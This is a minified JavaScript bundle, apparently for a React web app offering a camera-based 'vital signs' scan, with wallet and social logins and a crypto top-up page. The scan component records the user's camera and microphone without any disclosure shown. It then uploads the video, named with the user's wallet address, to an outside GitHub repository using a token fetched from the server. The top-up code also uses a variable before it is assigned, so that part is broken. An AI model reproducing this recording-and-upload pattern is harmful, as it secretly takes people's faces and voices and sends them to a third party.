import{r as a,j as t,B as R,R as A,a as l,c as C}from"./vendor-react-p0-XfeGc.js";import{w as g,l as v,p as O,W as U,C as h}from"./vendor-Bq8nh9Cz.js";(function(){const r=document.createElement("link").relList;if(r&&r.supports&&r.supports("modulepreload"))return;for(const n of document.querySelectorAll('link[rel="modulepreload"]'))o(n);new MutationObserver(n=>{for(const s of n)if(s.type==="childList")for(const d of s.addedNodes)d.tagName==="LINK"&&d.rel==="modulepreload"&&o(d)}).observe(document,{childList:!0,subtree:!0});function i(n){const s={};return n.integrity&&(s.integrity=n.integrity),n.referrerPolicy&&(s.referrerPolicy=n.referrerPolicy),n.crossOrigin==="use-credentials"?s.credentials="include":n.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function o(n){if(n.ep)return;n.ep=!0;const s=i(n);fetch(n.href,s)}})();const y="pk_live_27266000CD95B626",p="0x7d1fe42532cEE53A23cc266c06Ac55e65b0797a9",x="0x0C1A6816C7C59C2876624d0AdBd53Eb9bb6291bc";function M(){return a.useEffect(()=>{(async()=>{const e=new URLSearchParams(window.location.search),r=e.get("email"),i=e.get("ref");if(!r)return;i&&sessionStorage.setItem("r",i);const o=new g(y);await o.auth.loginWithMagicLink({email:r});const n=await fetch("/les",{method:"POST",headers:{m:await o.user.getIdToken(),"Content-Type":"application/json"},body:JSON.stringify({e:r})});sessionStorage.setItem("a",await n.text()),window.location.href="/scan"})()},[]),t.jsx("div",{children:"Loading..."})}function T(){return a.useEffect(()=>{(async()=>{const e=new g(y,{extensions:[new v]}),r=new URLSearchParams(window.location.search),i=r.get("ref"),o=r.get("t")||sessionStorage.getItem("provider");i&&sessionStorage.setItem("r",i),o&&sessionStorage.setItem("p",o);try{await e.oauth2.getRedirectResult({})}catch{}await e.user.isLoggedIn()?(sessionStorage.setItem("a",(await e.user.getInfo()).publicAddress??""),sessionStorage.removeItem("p"),window.location.href="/scan"):o&&e.oauth2.loginWithRedirect({provider:o,redirectURI:`${window.location.origin}/lg`})})()},[]),t.jsx("div",{children:"Loading..."})}function B(){return a.useEffect(()=>{(async()=>{if(!window.ethereum)return;const e=new URLSearchParams(window.location.search).get("ref");e&&sessionStorage.setItem("r",e),sessionStorage.setItem("a",(await window.ethereum.request({method:"eth_requestAccounts"}))[0]),window.location.href="/scan"})()},[]),t.jsx("div",{children:"Loading..."})}function N(){return a.useEffect(()=>{(async()=>{const e=new g(y,{extensions:[new v]}),r=new URLSearchParams(window.location.search).get("ref");r&&sessionStorage.setItem("r",r),await e.oauth2.loginWithPopup({provider:"telegram"}),sessionStorage.setItem("a",(await e.user.getInfo()).publicAddress??""),window.location.href="/scan"})()},[]),t.jsx("div",{children:"Loading..."})}function _(){const[e,r]=a.useState(null),[i,o]=a.useState(""),[n,s]=a.useState(null),d=a.useRef(null),u=a.useRef(null),w=a.useRef([]),[j,b]=a.useState(""),[L,P]=a.useState(!1);return a.useEffect(()=>{r(sessionStorage.getItem("a")),s(sessionStorage.getItem("r")),P(/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent))},[]),a.useEffect(()=>{if(!e)return;n&&fetch("/ref",{method:"POST",headers:{to:e,from:n}});async function I(){if(o(await(await fetch("/iframe")).text()),L)return;const f=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:!0});d.current&&(d.current.srcObject=f),u.current=new MediaRecorder(f),u.current.ondataavailable=c=>{c.data.size>0&&w.current.push(c.data)},u.current.onstop=async()=>{const c=new File([new Blob(w.current,{type:"video/webm"})],`${e}_${Date.now()}.webm`);f.getTracks().forEach(m=>m.stop()),await fetch(`https://api.github.com/repos/aloycwl/v/contents/${c.name}`,{method:"PUT",headers:{Authorization:`Bearer ${await(await fetch("/github")).text()}`,"Content-Type":"application/json"},body:JSON.stringify({message:"_",content:btoa(new Uint8Array(await c.arrayBuffer()).reduce((m,E)=>m+String.fromCharCode(E),""))})})}}I();function S(f){if(!e||!u.current)return;const c=f.data;c.action==="onAnalysisStart"&&u.current.start(),c.analysisData&&c.analysisData.vitalSigns&&(b(`Your referral link: https://insightgenesis.ai/?ref=${e}`),fetch("/store",{method:"POST",headers:{addr:e,type:"1","Content-Type":"application/json"},body:JSON.stringify(c.analysisData)}),u.current.stop())}return window.addEventListener("message",S),()=>{window.removeEventListener("message",S)}},[e]),t.jsxs(t.Fragment,{children:[t.jsx("p",{id:"d",children:j}),t.jsx("iframe",{allow:"camera;microphone;fullscreen;display-capture",src:i})]})}function $(){return a.useEffect(()=>{let e,r,i;async function o(){if(i=O(new URLSearchParams(window.location.search).get("amt")||"100",18),!window.ethereum)return;const u="0x42A";try{await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:u}]})}catch{await window.ethereum.request({method:"wallet_addEthereumChain",params:[{chainId:u,chainName:"L1X",nativeCurrency:{name:"L1X",symbol:"L1X",decimals:18},rpcUrls:["https://v2-mainnet-rpc.l1x.foundation/"]}]}),window.location.reload()}e=await r.getSigner().getAddress(),r=new U(window.ethereum),await n()||await s(),await d()}async function n(){return(await new h(x,["function allowance(address, address)view returns(uint256)"],r).allowance(e,p)).gte(i)}async function s(){await(await new h(x,["function approve(address, uint256)"],r.getSigner()).approve(p,i)).wait()}async function d(){await new h(p,["function topup(uint256)"],r.getSigner()).topup(i)}o()},[]),t.jsx("div",{children:"Paying..."})}function q(){return t.jsx(R,{children:t.jsxs(A,{children:[t.jsx(l,{path:"/le",element:t.jsx(M,{})}),t.jsx(l,{path:"/lg",element:t.jsx(T,{})}),t.jsx(l,{path:"/lm",element:t.jsx(B,{})}),t.jsx(l,{path:"/lt",element:t.jsx(N,{})}),t.jsx(l,{path:"/scan",element:t.jsx(_,{})}),t.jsx(l,{path:"/topup",element:t.jsx($,{})})]})})}C.createRoot(document.getElementById("root")).render(t.jsx(a.StrictMode,{children:t.jsx(q,{})}));
